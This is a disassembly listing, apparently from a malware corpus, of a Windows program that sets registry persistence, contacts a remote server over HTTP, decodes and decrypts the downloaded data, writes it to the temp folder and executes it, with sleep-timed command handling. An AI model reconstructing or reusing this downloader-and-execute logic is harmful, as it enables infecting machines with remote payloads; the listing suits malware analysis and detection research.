mov [ ebp + 0x8 ] esi
movzx esi bl
mov ebx [ ebp - 0xc ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ edi * 4 + rw-data ]
shr ebx 0x8
xor esi [ eax + 0x18 ]
movzx edx dl
mov [ ebp - 0x1c ] esi
movzx esi bl
mov ebx [ ebp - 0x1c ]
mov esi [ esi * 4 + rw-data ]
xor esi [ edx * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
shr edx 0x18
shr ebx 0x10
xor esi [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x8 ]
movzx edi bl
xor esi [ edx * 4 + rw-data ]
xor esi [ eax + 0x1c ]
mov edx esi
mov [ ebp - 0x18 ] esi
shr edx 0x8
movzx edx dl
mov edx [ edx * 4 + rw-data ]
xor edx [ edi * 4 + rw-data ]
mov edi [ ebp - 0x20 ]
shr edi 0x18
xor edx [ edi * 4 + rw-data ]
movzx edi cl
xor edx [ edi * 4 + rw-data ]
xor edx [ eax ]
mov [ ebp - 0x14 ] edx
mov edx esi
shr edx 0x10
movzx edx dl
mov edi [ ebp - 0x1c ]
mov edx [ edx * 4 + rw-data ]
shr edi 0x18
mov ebx ecx
xor edx [ edi * 4 + rw-data ]
shr ebx 0x8
movzx edi bl
mov ebx [ ebp - 0x20 ]
xor edx [ edi * 4 + rw-data ]
movzx edi [ ebp - 0x20 ]
shr ebx 0x8
xor edx [ edi * 4 + rw-data ]
shr esi 0x18
movzx edi bl
mov esi [ esi * 4 + rw-data ]
mov ebx ecx
xor esi [ edi * 4 + rw-data ]
xor edx [ eax + 0x4 ]
shr ebx 0x10
movzx edi bl
mov ebx [ ebp - 0x1c ]
xor esi [ edi * 4 + rw-data ]
movzx edi [ ebp - 0x1c ]
shr ebx 0x8
xor esi [ edi * 4 + rw-data ]
shr ecx 0x18
xor esi [ eax + 0x8 ]
mov [ ebp - 0xc ] esi
movzx esi bl
mov ebx [ ebp - 0x20 ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x10
movzx edi bl
mov ebx [ ebp - 0x14 ]
xor esi [ edi * 4 + rw-data ]
mov edi [ ebp - 0xc ]
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x18 ]
xor esi [ ecx * 4 + rw-data ]
xor esi [ eax + 0xc ]
sub eax 0x10
mov [ ebp - 0x8 ] esi
sub_40314d
push ebp
mov ebp esp
sub esp 0x100
push esi
push 0x200
push rw-data
push 0x0
call [ GetModuleFileNameA@IAT ]
call sub_403983
mov esi [ Sleep@IAT ]
and [ ebp + eax - 0xff ] 0x0
mov al [ rw-data ]
cmp al 0x44
je r-xdata
mov cl [ ecx ]
mov [ ebp + eax - 0x100 ] cl
inc eax
cmp eax 0x100
jb r-xdata
lea eax [ ebp - 0x100 ]
push eax
call sub_403255
mov [ esp ] 0x927c0
jmp r-xdata
cmp al 0x53
je r-xdata
cmp [ eax + rw-data ] 0x0
lea ecx [ eax + rw-data ]
je r-xdata
call esi
jmp r-xdata
lea eax [ ebp - 0x100 ]
push eax
call [ atoi@IAT ]
imul eax eax 0xea60
pop ecx
push eax
cmp al 0x64
je r-xdata
call sub_403203
call sub_4038b0
push rw-data
push rw-data
call sub_4035ec
pop ecx
xor eax eax
pop ecx
cmp al 0x73
je r-xdata
push 0x1b7740
jmp r-xdata
sub_403203
push ebp
mov ebp esp
sub esp 0x210
lea eax [ ebp - 0x210 ]
push eax
push 0x2
call [ WSAStartup@IAT ]
test eax eax
jne r-xdata
push esi
call [ WSACleanup@IAT ]
lea eax [ ebp - 0x80 ]
mov esi rw-data
push eax
push esi
call strcpy
push rw-data
push esi
call strcat
add esp 0x10
pop esi
leave
retn
lea eax [ ebp - 0x80 ]
push 0x80
push eax
call [ gethostname@IAT ]
sub_403255
push ebp
mov ebp esp
sub esp 0x20c
push ebx
push edi
push 0xf
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x97 ]
mov [ ebp - 0x98 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0xf
xor eax eax
pop ecx
lea edi [ ebp - 0x57 ]
mov [ ebp - 0x58 ] bl
mov [ ebp - 0x10 ] ebx
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
push rw-data
push [ ebp + 0x8 ]
call [ sscanf@IAT ]
add esp 0x10
cmp eax 0x2
je r-xdata
mov edi [ Sleep@IAT ]
push esi
mov esi [ InternetCloseHandle@IAT ]
push 0x124f80
call [ Sleep@IAT ]
jmp r-xdata
push ebx
push __dos_header
mov eax rw-data
push 0x3
push eax
push eax
lea eax [ ebp - 0x98 ]
push ebx
push eax
push [ ebp + 0x8 ]
call [ InternetConnectA@IAT ]
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
push 0x927c0
call edi
jmp r-xdata
pop edi
pop ebx
leave
retn
push [ ebp + 0x8 ]
push ebx
push 0x4000000
push rw-data
push ebx
lea ecx [ ebp - 0x58 ]
push rw-data
push ecx
push rw-data
push eax
call [ HttpOpenRequestA@IAT ]
cmp eax ebx
mov [ ebp - 0x4 ] eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push rw-data
call [ InternetOpenA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push eax
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call esi
push [ ebp - 0xc ]
jmp r-xdata
lea eax [ ebp - 0x18 ]
push ebx
push eax
lea eax [ ebp - 0xb8 ]
push eax
push 0x5
push [ ebp - 0x4 ]
mov [ ebp - 0x18 ] 0x20
call [ HttpQueryInfoA@IAT ]
lea eax [ ebp - 0xb8 ]
push eax
call [ atol@IAT ]
mov edi eax
lea eax [ edi + 0x1 ]
push eax
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x14 ] eax
pop ecx
lea ecx [ ebp - 0x10 ]
push ecx
push edi
push eax
push [ ebp - 0x4 ]
call [ InternetReadFile@IAT ]
cmp [ ebp - 0x10 ] ebx
je r-xdata
push [ ebp - 0x4 ]
call esi
push [ ebp - 0xc ]
call esi
call esi
jmp r-xdata
push [ ebp - 0x4 ]
call esi
push [ ebp - 0xc ]
call esi
push [ ebp + 0x8 ]
call esi
pop esi
mov al [ rw-data ]
push 0x3f
mov [ ebp - 0x20c ] al
pop ecx
xor eax eax
lea edi [ ebp - 0x20b ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x20c ]
mov edi 0x100
push eax
push edi
call [ GetTempPathA@IAT ]
lea eax [ ebp - 0x20c ]
push edi
push eax
lea eax [ ebp - 0x20c ]
push eax
call [ GetLongPathNameA@IAT ]
lea eax [ ebp - 0x20c ]
push rw-data
push eax
call strcat
mov edi [ strrchr@IAT ]
lea eax [ ebp - 0x58 ]
push 0x2f
push eax
call edi
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call strcat
pop ecx
pop ecx
lea eax [ ebp - 0x58 ]
push 0x2f
push eax
call edi
inc eax
push eax
lea eax [ ebp - 0x20c ]
push eax
call strcat
add esp 0x10
jmp r-xdata
lea eax [ ebp - 0x20c ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x20c ]
push rw-data
push eax
call [ fopen@IAT ]
add esp 0x10
cmp eax ebx
mov [ ebp - 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x20c ]
push 0x2e
push eax
call edi
pop ecx
mov [ eax ] bl
pop ecx
lea eax [ ebp - 0x20c ]
push 0x2e
push eax
call edi
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov [ rw-data ] eax
call ??2@YAPAXI@Z
push [ rw-data ]
mov edi eax
push ebx
push edi
call memset
push edi
push [ ebp - 0x14 ]
call sub_403564
mov eax [ rw-data ]
push [ ebp - 0x8 ]
add eax 0xfffffff9
push eax
push 0x1
push edi
call [ fwrite@IAT ]
push edi
call ??3@YAXPAX@Z
push [ ebp - 0x8 ]
call [ fflush@IAT ]
push [ ebp - 0x8 ]
call [ fclose@IAT ]
push 0x44
lea eax [ ebp - 0x10c ]
pop edi
push edi
push ebx
push eax
call memset
add esp 0x40
mov [ ebp - 0x10c ] edi
mov [ ebp - 0xdc ] bx
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
lea ecx [ ebp - 0xc8 ]
push ecx
lea ecx [ ebp - 0x10c ]
push ecx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea ecx [ ebp - 0x20c ]
push ebx
push ecx
call eax
push [ ebp - 0x14 ]
call ??3@YAXPAX@Z
pop ecx
sub_403564
push ebp
mov ebp esp
sub esp 0x21c
push ebx
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x14 ]
lea eax [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x80
push eax
lea ecx [ ebp - 0x21c ]
mov [ ebp - 0x21c ] r--data
movsb [ edi ] [ esi ]
call sub_4012b0
mov eax [ rw-data ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push 0x6
pop esi
lea ecx [ eax - 0x10 ]
cmp ecx esi
jl r-xdata
cmp esi eax
jge r-xdata
lea eax [ edi + esi - 0x6 ]
lea ecx [ ebp - 0x21c ]
push eax
lea eax [ esi + ebx ]
push eax
call sub_402314
mov eax [ rw-data ]
add esi 0x10
lea ecx [ eax - 0x10 ]
cmp esi ecx
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov al [ esi + ebx ]
mov [ edi + esi - 0x6 ] al
inc esi
cmp esi [ rw-data ]
jl r-xdata
sub_4035ec
push ebp
mov ebp esp
sub esp 0x100
mov ax [ rw-data ]
push esi
push edi
push 0x3f
mov [ ebp - 0x100 ] ax
pop ecx
xor eax eax
lea edi [ ebp - 0xfe ]
mov esi [ strstr@IAT ]
push rw-data
push [ ebp + 0x8 ]
[ edi ]
stosw [ edi ]
call esi
push rw-data
mov edi eax
push [ ebp + 0x8 ]
call esi
add esp 0x10
test edi edi
je r-xdata
xor eax eax
test eax eax
je r-xdata
sub eax edi
add edi 0x4
sub eax 0x4
push eax
lea eax [ ebp - 0x100 ]
push edi
push eax
call [ strncpy@IAT ]
lea eax [ ebp - 0x100 ]
push 0x0
push eax
push [ ebp + 0xc ]
call sub_403670
add esp 0x18
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
leave
retn
sub_403670
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
test eax eax
push edi
jne r-xdata
and [ ebp + 0xc ] 0x0
and [ ebp - 0xc ] 0x0
mov ebx [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
test ecx ecx
mov [ ebp - 0x8 ] esi
jle r-xdata
push esi
call strlen
pop ecx
mov [ ebp + 0x10 ] eax
cmp [ ebp - 0xc ] eax
jge r-xdata
lea eax [ ecx + 0x3 ]
shr eax 0x2
mov [ ebp - 0x10 ] eax
lea ecx [ eax + eax * 2 ]
shl eax 0x2
mov [ ebp + 0xc ] ecx
mov [ ebp - 0xc ] eax
and [ ebx ] 0x0
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
leave
retn
sub eax [ ebp - 0xc ]
xor esi esi
mov [ ebp + 0x10 ] esi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
mov [ ebp + 0x8 ] edi
shr [ ebp + 0x8 ] 0x8
push [ ebp + 0x8 ]
call sub_403864
mov esi eax
push edi
and esi 0xff0
shl esi 0x2
sar esi 0x6
call sub_403864
mov [ ebp - 0x4 ] edi
and eax 0x3f
shr [ ebp - 0x4 ] 0x10
push [ ebp - 0x4 ]
shl eax 0x2
or esi eax
call sub_403864
push [ ebp + 0x8 ]
and eax 0x3fc
shl eax 0x2
sar eax 0x4
mov [ ebp - 0x14 ] eax
call sub_403864
mov ecx [ ebp - 0x14 ]
and eax 0xf
shl eax 0x4
shr edi 0x18
or ecx eax
push edi
mov [ ebp + 0x8 ] ecx
call sub_403864
push [ ebp - 0x4 ]
mov edi eax
and edi 0xff
shl edi 0x2
sar edi 0x2
call sub_403864
and eax 0x3
add [ ebp - 0x8 ] 0x4
shl eax 0x6
or edi eax
add esp 0x18
shl edi 0x8
or edi [ ebp + 0x8 ]
shl edi 0x8
or edi esi
mov [ ebx ] edi
add ebx 0x3
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x10 ] esi
shr [ ebp + 0x10 ] 0x8
push [ ebp + 0x10 ]
call sub_403864
mov edx eax
push esi
shl edx 0x2
sar edx 0x6
mov [ ebp + 0x8 ] edx
call sub_403864
pop ecx
pop ecx
mov ecx [ ebp + 0x8 ]
shl al 0x2
or cl al
mov eax esi
mov [ ebx ] cl
inc ebx
inc [ ebp + 0xc ]
and eax 0xff00
cmp eax 0x3d00
je r-xdata
mov esi [ ebp - 0x8 ]
mov ecx eax
lea edi [ ebp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebp + 0x10 ]
mov eax esi
and eax 0xff0000
cmp eax 0x3d0000
je r-xdata
mov eax esi
and eax 0xff0000
cmp eax 0x3d0000
je r-xdata
mov eax esi
and eax 0xff000000
cmp eax 0x3d000000
je r-xdata
mov eax esi
shr eax 0x10
push eax
call sub_403864
push [ ebp + 0x10 ]
mov edx eax
shl edx 0x2
sar edx 0x4
mov [ ebp + 0x10 ] edx
call sub_403864
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
shl al 0x4
or cl al
mov [ ebx ] cl
inc ebx
inc [ ebp + 0xc ]
mov eax esi
shr eax 0x18
push eax
call sub_403864
mov edx eax
shl edx 0x2
shr esi 0x10
sar edx 0x2
push esi
mov [ ebp + 0x10 ] edx
call sub_403864
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
shl al 0x6
or cl al
mov [ ebx ] cl
inc ebx
inc [ ebp + 0xc ]
sub_403864
mov cl [ esp + 0x4 ]
or eax 0xffffffff
cmp cl 0x41
jl r-xdata
cmp cl 0x61
jl r-xdata
cmp cl 0x5a
jg r-xdata
cmp cl 0x30
jl r-xdata
cmp cl 0x7a
jg r-xdata
movsx eax cl
sub eax 0x41
retn
cmp cl 0x2b
jne r-xdata
cmp cl 0x39
jg r-xdata
movsx eax cl
sub eax 0x47
retn
cmp cl 0x2f
jne r-xdata
push 0x3e
pop eax
retn
movsx eax cl
add eax 0x4
retn
retn
push 0x3f
pop eax
sub_4038b0
push ecx
push ecx
push ebx
push ebp
push esi
mov esi [ InternetCloseHandle@IAT ]
push edi
push edi
push __dos_header
mov eax rw-data
push 0x3
push eax
push eax
push edi
push rw-data
push ebp
call [ InternetConnectA@IAT ]
mov ebx eax
cmp ebx edi
je r-xdata
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
push ebp
push edi
push 0x4000000
push rw-data
push edi
push rw-data
push rw-data
push rw-data
push ebx
call [ HttpOpenRequestA@IAT ]
mov edi eax
xor eax eax
cmp edi eax
jne r-xdata
xor edi edi
push edi
push edi
push edi
push edi
push rw-data
call [ InternetOpenA@IAT ]
mov ebp eax
cmp ebp edi
jne r-xdata
push eax
push eax
push eax
push eax
push edi
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
push ebp
call esi
push ebx
jmp r-xdata
lea eax [ esp + 0x14 ]
push eax
push 0x40
push rw-data
push edi
call [ InternetReadFile@IAT ]
push edi
mov [ esp + 0x14 ] eax
call esi
push ebx
call esi
push ebp
call esi
cmp [ esp + 0x10 ] 0x0
je r-xdata
push edi
call esi
push ebx
call esi
call esi
jmp r-xdata
mov al [ rw-data ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
sub_403983
push ebp
mov ebp esp
push ecx
push esi
push edi
lea eax [ ebp - 0x4 ]
mov edi rw-data
push eax
mov esi 0x80000001
push edi
push esi
call [ RegOpenKeyA@IAT ]
test eax eax
je r-xdata
mov esi rw-data
push esi
call [ lstrlenA@IAT ]
push eax
push esi
push 0x1
pop esi
push esi
push 0x0
push rw-data
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push edi
push esi
call [ RegCreateKeyA@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
mov eax esi
pop edi
pop esi
leave
retn
xor esi esi
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_403b89
cmp [ rw-data ] ebx
jne r-xdata
call sub_403b74
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_403b86
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_40314d
strcat
jmp [ strcat@IAT ]
strcpy
jmp [ strcpy@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
memset
jmp [ memset@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
strlen
jmp [ strlen@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_403b74
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_403b86
xor eax eax
retn
sub_403b89
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
